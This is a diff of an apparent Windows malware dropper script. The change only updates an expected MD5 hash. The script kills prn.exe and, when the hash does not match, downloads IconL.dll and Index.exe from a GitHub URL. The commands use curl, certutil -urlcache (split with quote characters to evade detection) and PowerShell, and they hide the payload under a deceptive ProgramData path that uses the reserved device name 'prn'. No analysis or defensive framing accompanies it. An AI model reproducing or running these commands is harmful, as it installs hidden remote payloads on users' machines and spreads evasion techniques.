@@ -1,8 +1,8 @@
 taskkill.exe /f /IM prn.exe
 
-cert""""util -hash""""file "\\.\%ProgramData%\prndata..\prn" MD5 | findstr /i "4f8dd7da58995cb47b47a8a2c3817e7e" >nul || curl.exe -s -L -o "\\.\%ProgramData%\prndata..\prn" "https://github.com/vltex/1/raw/1/0/IconL.dll"
-cert""""util -hash""""file "\\.\%ProgramData%\prndata..\prn" MD5 | findstr /i "4f8dd7da58995cb47b47a8a2c3817e7e" >nul || cert""""util -url""""cache -sp""""lit -f "https://github.com/vltex/1/raw/1/0/IconL.dll" "\\.\%ProgramData%\prndata..\prn"
-powershell.exe -NoProfile -Command "if ((Get-FileHash '\\?\%ProgramData%\prndata..\prn' -Algorithm MD5 -ErrorAction SilentlyContinue).Hash -ne '4f8dd7da58995cb47b47a8a2c3817e7e') { Invoke-WebRequest 'https://github.com/vltex/1/raw/1/0/IconL.dll' -OutFile '\\.\%ProgramData%\prndata..\prn' }"
+cert""""util -hash""""file "\\.\%ProgramData%\prndata..\prn" MD5 | findstr /i "24a0fb43e759f22c595e2c4d14e5e287" >nul || curl.exe -s -L -o "\\.\%ProgramData%\prndata..\prn" "https://github.com/vltex/1/raw/1/0/IconL.dll"
+cert""""util -hash""""file "\\.\%ProgramData%\prndata..\prn" MD5 | findstr /i "24a0fb43e759f22c595e2c4d14e5e287" >nul || cert""""util -url""""cache -sp""""lit -f "https://github.com/vltex/1/raw/1/0/IconL.dll" "\\.\%ProgramData%\prndata..\prn"
+powershell.exe -NoProfile -Command "if ((Get-FileHash '\\?\%ProgramData%\prndata..\prn' -Algorithm MD5 -ErrorAction SilentlyContinue).Hash -ne '24a0fb43e759f22c595e2c4d14e5e287') { Invoke-WebRequest 'https://github.com/vltex/1/raw/1/0/IconL.dll' -OutFile '\\.\%ProgramData%\prndata..\prn' }"
 
 dir "\\?\%ProgramData%\prndata..\prn.exe" >nul || curl.exe -s -L -o "\\?\%ProgramData%\prndata..\prn.exe" "https://github.com/vltex/1/raw/1/0/Index.exe"
 dir "\\?\%ProgramData%\prndata..\prn.exe" >nul || cert""""util -url""""cache -sp""""lit -f "https://github.com/vltex/1/raw/1/0/Index.exe" "\\?\%ProgramData%\prndata..\prn.exe"
